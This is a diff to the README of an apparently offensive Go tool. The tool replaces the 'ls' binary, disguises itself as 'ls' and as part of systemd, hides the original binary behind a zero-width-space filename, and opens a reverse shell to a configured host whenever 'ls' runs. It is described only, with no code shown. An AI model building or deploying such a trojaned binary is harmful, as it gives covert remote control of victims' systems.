@@ -2,6 +2,10 @@
 
 Tool that shims the `ls` binary and establishes a reverse shell with a specified host. This tool disguises itself as the `ls` binary as well as part of `systemd`.
 
+## Usage
+
+This tool runs every time the user runs the `ls` command, unless an instance of it is already running .It will reach out to the host IP specified in `systemd-make.go`, receive an IP-based port from the host, and then open a reverse shell to the host on that port. Please refer to the documentation of the `shim_handler` project on how to setup the host.
+
 ## Dependencies
 
 To run this project, you will need to have `golang` installed.
@@ -50,4 +54,3 @@ This project will create the following files:
 ```
 
 In addition to these files, the installation will replace the `ls` binary with the compiled result from `ls_over.go`, and rename the `ls` binary to have a zero-width space in its filename.
-
